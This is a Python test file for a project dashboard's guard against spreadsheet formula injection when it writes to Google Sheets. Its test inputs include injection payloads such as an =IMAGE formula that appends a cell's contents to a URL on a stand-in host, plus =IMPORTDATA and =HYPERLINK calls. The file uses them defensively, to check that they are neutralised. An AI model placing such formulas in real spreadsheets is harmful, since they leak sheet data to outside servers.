# -*- coding: utf-8 -*-
"""구글 시트 USER_ENTERED 쓰기 공통 수식 방지 (2026-11-13 보안 점검 2차 #12·보류 A).

리드에서 ' 를 붙여 막은 글은 다시 읽으면 ' 가 빠진 채 온다 → 공사 등록·거래처명 채우기 등에서 그대로 쓰면
수식이 되살아났다. GoogleSheetsManager 의 쓰기 함수에서 한 번에 막고, 코드가 만드는 계산식은 그대로 둔다.
"""
import sys
import threading

sys.path.insert(0, '.')

import pytest

from dashboard.blueprints.projects import _new_row_formulas
from dashboard.services.payer_split import total2_formula
from dashboard.utils.google_sheets import GoogleSheetsManager
from dashboard.utils.spreadsheet_safe import sheet_cell_safe, sheet_data_safe, sheet_row_safe

F2L = dict(zip(['총액 1', '부가세', '총액 2', '계약금', '중도금', '잔금', '제품대', '도급비', '자재비', '기타비', '순익'],
               ['R', 'S', 'T', 'U', 'V', 'W', 'AE', 'AF', 'AG', 'AH', 'AI']))


def test_code_calc_formulas_kept():
    for v in _new_row_formulas(F2L, 3648).values():
        assert sheet_cell_safe(v) == v
    for vf in (0, 300000):
        f = total2_formula(10, 'R', 'S', vf)
        assert sheet_cell_safe(f) == f
    # 개인 탭 계산식 모양(빈 글자 "" 포함)
    for f in ('=IF($A5="","",N($R5)-SUM($AB5:$AE5))', '=IF($A5="","",IF(OR(N($R5)=0,N($AF5)=0),0,$AF5/$R5))'):
        assert sheet_cell_safe(f) == f


@pytest.mark.parametrize('v', [
    '=HYPERLINK("https://x.example","견적서 확인")',
    '=IMAGE("https://x.example/?d="&A1)',
    '=IMPORTDATA("https://x.example")',
    '=ENCODEURL(A1)',
    '=Sheet2!A1',
    '=SUM(A:A)',
    '=CONCAT(A1,B1)',
    '+821012345678',
    '@JW',
    '- 메모',
    '\t탭',
])
def test_risky_values_quoted(v):
    assert sheet_cell_safe(v) == "'" + v


@pytest.mark.parametrize('v', ['-', '-5,000', '-12.5', '2026-11-13', "'=x", '서울 강남구', '', None, 5000, 1.5, True])
def test_plain_values_unchanged(v):
    assert sheet_cell_safe(v) == v


def test_row_and_data_helpers():
    assert sheet_row_safe(['G1', '=HYPERLINK("u","a")', 3]) == ['G1', '\'=HYPERLINK("u","a")', 3]
    data = sheet_data_safe([{'range': 'A1', 'values': [['=IMAGE("u")', '-']]}])
    assert data == [{'range': 'A1', 'values': [['\'=IMAGE("u")', '-']]}]


# ── GoogleSheetsManager 쓰기 함수가 실제로 방지된 값을 보내는지 ──────────────────

class _Req:
    def __init__(self, sink, kw):
        sink.append(kw)

    def execute(self):
        return {'totalUpdatedCells': 1}


class _Values:
    def __init__(self):
        self.calls = []

    def update(self, **kw):
        return _Req(self.calls, kw)

    def batchUpdate(self, **kw):
        return _Req(self.calls, kw)


def _mgr():
    m = object.__new__(GoogleSheetsManager)
    vals = _Values()
    sheets = type('S', (), {'values': lambda _s: vals})()
    m.service = type('Svc', (), {'spreadsheets': lambda _s: sheets})()
    m._lock = threading.RLock()
    m._execute_with_retry = lambda fn, label=None, *a, **k: fn().execute()
    return m, vals


def test_update_cell_value_guarded():
    m, vals = _mgr()
    assert m.update_cell_value('sid', '공사 현황', 'E10', '=HYPERLINK("u","a")') is True
    assert vals.calls[-1]['body'] == {'values': [['\'=HYPERLINK("u","a")']]}
    m.update_cell_value('sid', '공사 현황', 'U10', 500000)
    assert vals.calls[-1]['body'] == {'values': [[500000]]}


def test_batch_update_cells_guarded_and_formula_kept():
    m, vals = _mgr()
    calc = _new_row_formulas(F2L, 7)['미수금']
    m.batch_update_cells('sid', [{'range': "'공사 현황'!G7", 'values': [['=IMAGE("u")']]},
                                 {'range': "'공사 현황'!X7", 'values': [[calc]]}])
    data = vals.calls[-1]['body']['data']
    assert data[0]['values'] == [['\'=IMAGE("u")']] and data[1]['values'] == [[calc]]
